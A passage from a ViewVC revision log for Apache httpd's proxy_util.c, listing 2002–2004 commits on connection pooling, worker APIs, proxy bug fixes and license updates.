Add worker status flag definitions.

Submitted by: mturk

```

---

Revision [**104610**](/viewvc?view=revision&revision=104610) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104610&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104610&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104610))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104610)

Modified
*Wed Aug 11 22:55:28 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 54914 byte(s)

Diff to [previous 104602](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104602&r2=104610)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104602&r2=104610&diff_format=h))
```
Set initial lbstatus to calculated lbfactor.

Submitted by: mturk

```

---

Revision [**104602**](/viewvc?view=revision&revision=104602) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104602&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104602&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104602))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104602)

Modified
*Wed Aug 11 22:44:38 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 54976 byte(s)

Diff to [previous 104600](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104600&r2=104602)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104600&r2=104602&diff_format=h))
```
Fix the assertion bug for reslist caused by returning the
same connection back to the pool twice.

Submitted by: mturk

```

---

Revision [**104600**](/viewvc?view=revision&revision=104600) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104600&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104600&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104600))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104600)

Modified
*Wed Aug 11 22:41:02 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 55526 byte(s)

Diff to [previous 104599](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104599&r2=104600)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104599&r2=104600&diff_format=h))
```
Change the scheme handler hook to include worker.
We will probably need the balancer too, but that can wait for now.
Other undocumented changes (shame,shame) in proxy_util.c

Submitted by: mturk

```

---

Revision [**104599**](/viewvc?view=revision&revision=104599) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104599&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104599&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104599))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104599)

Modified
*Wed Aug 11 22:39:02 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 54667 byte(s)

Diff to [previous 104598](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104598&r2=104599)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104598&r2=104599&diff_format=h))
```
Added close_on_recycle flags for creatin connections.
This flag enables to distinguish between connection types.
Also added a pool cleanup bound to connection pool that recycles
the connection when client disconnects from server.

Submitted by: mturk

```

---

Revision [**104598**](/viewvc?view=revision&revision=104598) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104598&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104598&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104598))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104598)

Modified
*Wed Aug 11 22:37:08 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 53499 byte(s)

Diff to [previous 104597](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104597&r2=104598)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104597&r2=104598&diff_format=h))
```
Added acquire and release connection functions.
The acquire pulls the connection from the pool.
The release returns the connection to the pool.

Submitted by: mturk

```

---

Revision [**104597**](/viewvc?view=revision&revision=104597) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104597&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104597&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104597))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104597)

Modified
*Wed Aug 11 22:36:28 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 52946 byte(s)

Diff to [previous 104595](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104595&r2=104597)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104595&r2=104597&diff_format=h))
```
Added ap_proxy_connection_create function that makes
conn_rec for opened connection. It is used bt http(s) and ftp for
bounding the backend connection to client connection with the same id's.

Submitted by: mturk

```

---

Revision [**104595**](/viewvc?view=revision&revision=104595) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104595&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104595&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104595))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104595)

Modified
*Wed Aug 11 22:34:26 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 50626 byte(s)

Diff to [previous 104593](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104593&r2=104595)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104593&r2=104595&diff_format=h))
```
Add ap_proxy_connect_backend that will replace
ap_proxy_connect_to_backend. It uses worker params for setting socket
options and checks for conection's connect status.
It works both on empty and acquired connections.

Submitted by: mturk

```

---

Revision [**104593**](/viewvc?view=revision&revision=104593) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104593&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104593&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104593))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104593)

Modified
*Wed Aug 11 22:32:22 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 46923 byte(s)

Diff to [previous 104591](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104591&r2=104593)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104591&r2=104593&diff_format=h))
```
Change the way the prefork connection is created.
Use the same constructor as for theaded mpm's.
Added API's for destroying and closing connections

Submitted by: mturk

```

---

Revision [**104591**](/viewvc?view=revision&revision=104591) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104591&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104591&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104591))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104591)

Modified
*Wed Aug 11 22:30:06 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 46339 byte(s)

Diff to [previous 104590](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104590&r2=104591)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104590&r2=104591&diff_format=h))
```
Added acquire timeout for obtaining resources from reslist.
The timeout is in milliseconds to enable quick return in case the
reslist is exceded the maximum number of connections.

Submitted by: mturk

```

---

Revision [**104590**](/viewvc?view=revision&revision=104590) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104590&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104590&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104590))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104590)

Modified
*Wed Aug 11 22:28:59 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 45423 byte(s)

Diff to [previous 104589](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104589&r2=104590)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104589&r2=104590&diff_format=h))
```
Remove proxy_mdule_conf.
We will change the scheme hook api to include the worker.

Submitted by: mturk

```

---

Revision [**104589**](/viewvc?view=revision&revision=104589) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104589&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104589&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104589))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104589)

Modified
*Wed Aug 11 22:27:34 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 45480 byte(s)

Diff to [previous 104587](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104587&r2=104589)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104587&r2=104589&diff_format=h))
```
Remove proxy_conn struct and add it's params to proxy_conn_rec.
Use named structure type declarations.

Submitted by: mturk

```

---

Revision [**104587**](/viewvc?view=revision&revision=104587) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104587&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104587&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104587))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104587)

Modified
*Wed Aug 11 22:15:23 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 45515 byte(s)

Diff to [previous 104586](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104586&r2=104587)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104586&r2=104587&diff_format=h))
```
Use the worker pool for creating proxy_conn_poll to suppress it's
destruction when cleaning worker.

Submitted by: mturk

```

---

Revision [**104586**](/viewvc?view=revision&revision=104586) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104586&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104586&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104586))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104586)

Modified
*Wed Aug 11 22:14:49 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 45032 byte(s)

Diff to [previous 104585](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104585&r2=104586)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104585&r2=104586&diff_format=h))
```
Arrange the handling of apr_array_header_t arrays.

Submitted by: jfclere

```

---

Revision [**104585**](/viewvc?view=revision&revision=104585) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104585&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104585&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104585))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104585)

Modified
*Wed Aug 11 22:13:50 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 45002 byte(s)

Diff to [previous 104584](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104584&r2=104585)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104584&r2=104585&diff_format=h))
```
Make proxy_conn always accesible for preforked MPM and
APR_HAS_THREADS enabled.

Add init_conn_worker for creating apr_reslist that maintains connection
pool. For prefork mpm's use the single connection container.

Submitted by: mturk

```

---

Revision [**104584**](/viewvc?view=revision&revision=104584) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104584&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104584&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104584))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104584)

Modified
*Wed Aug 11 22:12:02 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 44098 byte(s)

Diff to [previous 104582](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104582&r2=104584)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104582&r2=104584&diff_format=h))
```
Add some source comments about worker DNS lookup.

Submitted by: mturk

```

---

Revision [**104582**](/viewvc?view=revision&revision=104582) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104582&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104582&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104582))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104582)

Modified
*Wed Aug 11 22:05:20 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 43953 byte(s)

Diff to [previous 104578](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104578&r2=104582)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104578&r2=104582&diff_format=h))
```
Added ap_proxy_determine_connection.
It will be used both for http and ajp handlers.
Started writing apr_reslist connection pool.

Submitted by: mturk

```

---

Revision [**104578**](/viewvc?view=revision&revision=104578) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104578&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104578&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104578))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104578)

Modified
*Wed Aug 11 22:00:47 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 39344 byte(s)

Diff to [previous 104575](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104575&r2=104578)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104575&r2=104578&diff_format=h))
```
Add ap_proxy_pre_request API function.
It calls the actual module pre_request hook if present

Submitted by: mturk

```

---

Revision [**104575**](/viewvc?view=revision&revision=104575) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104575&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104575&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104575))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104575)

Modified
*Wed Aug 11 21:49:40 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 38053 byte(s)

Diff to [previous 104574](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104574&r2=104575)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104574&r2=104575&diff_format=h))
```
Make sure that APR_MAJOR_VERSION is defined.

Submitted by: jfclere

```

---

Revision [**104574**](/viewvc?view=revision&revision=104574) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104574&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104574&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104574))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104574)

Modified
*Wed Aug 11 21:46:54 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 38028 byte(s)

Diff to [previous 104573](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104573&r2=104574)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104573&r2=104574&diff_format=h))
```
Remove all worker/balancer API's to proxy_util.

Submitted by: mturk

```

---

Revision [**104573**](/viewvc?view=revision&revision=104573) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104573&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104573&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104573))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104573)

Modified
*Wed Aug 11 21:45:53 2004 UTC*
(20 years, 5 months ago)
by *wrowe*

File length: 31494 byte(s)

Diff to [previous 104070](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104070&r2=104573)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=104070&r2=104573&diff_format=h))
```

  Missed a 2.0-HEAD proxy back-compat patch

```

---

Revision [**104070**](/viewvc?view=revision&revision=104070) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104070&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=104070&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=104070))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=104070)

Modified
*Tue Jun 29 06:37:21 2004 UTC*
(20 years, 7 months ago)
by *niq*

File length: 31384 byte(s)

Diff to [previous 103698](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=103698&r2=104070)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=103698&r2=104070&diff_format=h))
```
Fix for multiple proxy bugs - review please:

#10722  Reverse proxying cookies
#15207  Proxy passing canonicalised URIs to backend
#16812  Case-insensitivity of proxypassreverse
#19317  Canonicalised URI causing infinite loop
#20372  AllowEncodedSlashes
May also fix 13577 (untested)

This is really two fixes: 10722 and 15207; the others are trivial consequences.
To make review easier, the simpler fix (#15207) is entirely contained in
#ifdef FIX_15207 (new code) and
#ifndef FIX_15207 (removed code)

```

---

Revision [**103698**](/viewvc?view=revision&revision=103698) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=103698&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=103698&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=103698))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=103698)

Modified
*Wed May 19 13:30:14 2004 UTC*
(20 years, 8 months ago)
by *trawick*

File length: 35169 byte(s)

Diff to [previous 102618](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=102618&r2=103698)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=102618&r2=103698&diff_format=h))
```
Fix handling of IPv6 numeric strings in mod_proxy.

(Some such operations would work if port was specified
in url due to way parsing was performed, finding last ':'
and considering everything after as the port.)

```

---

Revision [**102618**](/viewvc?view=revision&revision=102618) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=102618&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=102618&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=102618))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=102618)

Modified
*Mon Feb 9 20:31:03 2004 UTC*
(20 years, 11 months ago)
by *nd*

File length: 35561 byte(s)

Diff to [previous 102572](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=102572&r2=102618)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=102572&r2=102618&diff_format=h))
```
fix name of The Apache Software Foundation

```

---

Revision [**102572**](/viewvc?view=revision&revision=102572) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=102572&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=102572&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=102572))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=102572)

Modified
*Sun Feb 8 12:27:14 2004 UTC*
(20 years, 11 months ago)
by *nd*

File length: 35557 byte(s)

Diff to [previous 102525](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=102525&r2=102572)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=102525&r2=102572&diff_format=h))
```
fix copyright dates according to the first check in

```

---

Revision [**102525**](/viewvc?view=revision&revision=102525) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=102525&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=102525&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=102525))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=102525)

Modified
*Fri Feb 6 22:58:42 2004 UTC*
(20 years, 11 months ago)
by *nd*

File length: 35557 byte(s)

Diff to [previous 102135](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=102135&r2=102525)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=102135&r2=102525&diff_format=h))
```
apply Apache License, Version 2.0

```

---

Revision [**102135**](/viewvc?view=revision&revision=102135) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=102135&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=102135&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=102135))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=102135)

Modified
*Thu Jan 1 13:26:26 2004 UTC*
(21 years ago)
by *nd*

File length: 37776 byte(s)

Diff to [previous 101154](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=101154&r2=102135)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=101154&r2=102135&diff_format=h))
```
update license to 2004.

```

---

Revision [**101154**](/viewvc?view=revision&revision=101154) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=101154&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=101154&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=101154))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=101154)

Modified
*Wed Sep 3 19:27:12 2003 UTC*
(21 years, 4 months ago)
by *trawick*

File length: 37776 byte(s)

Diff to [previous 99363](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=99363&r2=101154)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=99363&r2=101154&diff_format=h))
```
switch to APR 1.0 API (which is still in flux)

because of the changes to the argument lists of apr_mmap_dup and apr_socket_create,
2.1-dev won't build with apr and apr-util's 0.9 branch anymore

```

---

Revision [**99363**](/viewvc?view=revision&revision=99363) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=99363&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=99363&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=99363))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=99363)

Modified
*Tue Apr 15 16:01:02 2003 UTC*
(21 years, 9 months ago)
by *minfrin*

File length: 37766 byte(s)

Diff to [previous 98573](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=98573&r2=99363)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=98573&r2=99363&diff_format=h))
```
Fixed a segfault when multiple ProxyBlock directives were used.
PR:		19023
Obtained from:
Submitted by:	Sami Tikka <sami.tikka@f-secure.com>
Reviewed by:

```

---

Revision [**98573**](/viewvc?view=revision&revision=98573) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=98573&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=98573&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=98573))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=98573)

Modified
*Mon Feb 3 17:53:28 2003 UTC*
(21 years, 11 months ago)
by *nd*

File length: 37687 byte(s)

Diff to [previous 97202](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=97202&r2=98573)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=97202&r2=98573&diff_format=h))
```
finished that boring job:
update license to 2003.

Happy New Year! ;-))

```

---

Revision [**97202**](/viewvc?view=revision&revision=97202) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=97202&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=97202&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=97202))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=97202)

Modified
*Mon Oct 14 14:11:24 2002 UTC*
(22 years, 3 months ago)
by *jim*

File length: 37687 byte(s)

Diff to [previous 96528](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=96528&r2=97202)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=96528&r2=97202&diff_format=h))
```
Haven't heard any vetoes regarding this, so might as well fold it
in. Not too happy about cluttering up the list of directives either.
But, at least, it allows 2.0 to proxy stupid IIS as much as 1.3.
Docs to come soon.
PR:
Obtained from:
Submitted by:
Reviewed by:

```

---

Revision [**96528**](/viewvc?view=revision&revision=96528) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=96528&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=96528&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=96528))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=96528)

Modified
*Sun Aug 25 20:40:11 2002 UTC*
(22 years, 5 months ago)
by *ianh*

File length: 36319 byte(s)

Diff to [previous 96057](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=96057&r2=96528)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=96057&r2=96528&diff_format=h))
```
make the output XHTML
Submitted by : Erik Abele <erik@codefaktor.de>

```

---

Revision [**96057**](/viewvc?view=revision&revision=96057) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=96057&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=96057&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=96057))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=96057)

Modified
*Mon Jul 15 08:05:11 2002 UTC*
(22 years, 6 months ago)
by *wrowe*

File length: 36315 byte(s)

Diff to [previous 96055](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=96055&r2=96057)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=96055&r2=96057&diff_format=h))
```

  http occurances to update for apr_socket_opt_get/set

```

---

Revision [**96055**](/viewvc?view=revision&revision=96055) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=96055&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=96055&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=96055))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=96055)

Modified
*Mon Jul 15 07:46:19 2002 UTC*
(22 years, 6 months ago)
by *wrowe*

File length: 36303 byte(s)

